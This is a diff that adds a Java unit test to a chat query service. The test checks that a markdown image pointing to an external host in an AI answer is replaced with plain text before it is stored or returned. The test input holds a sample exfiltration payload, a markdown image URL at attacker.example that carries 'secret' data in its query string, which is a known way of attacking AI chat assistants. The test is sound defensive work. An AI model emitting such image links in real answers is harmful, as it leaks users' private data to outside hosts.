@@ -397,6 +397,20 @@ class QueryServiceTest {
                 .containsExactly("u".repeat(4000), "a".repeat(4000));
     }
 
+    @Test
+    @DisplayName("답변의 외부 이미지는 글자로 바꿔 저장하고 응답한다")
+    void query_answerExternalImage_neutralized() {
+        PipelineQueryResponse response = new PipelineQueryResponse("요약 ![x](https://attacker.example/a.png?q=비밀)",
+                null, List.of(), List.of(), null, List.of(), false, false, 0, null);
+
+        QueryResponse result = complete("질문", false, response);
+
+        ArgumentCaptor<ChatMessage> messageCaptor = ArgumentCaptor.forClass(ChatMessage.class);
+        verify(chatMessageRepository).save(messageCaptor.capture());
+        assertThat(messageCaptor.getValue().getContent()).isEqualTo("요약 외부 이미지(attacker.example)");
+        assertThat(result.assistantMessage().content()).isEqualTo("요약 외부 이미지(attacker.example)");
+    }
+
     private QueryResponse complete(String question, boolean webSearch, PipelineQueryResponse response) {
         var context = queryService.prepareMessages(SESSION_ID, question, "query_test", "openai", "gpt-5-nano", webSearch);
         return queryService.completeAsync(SESSION_ID, question, "query_test", context, response);
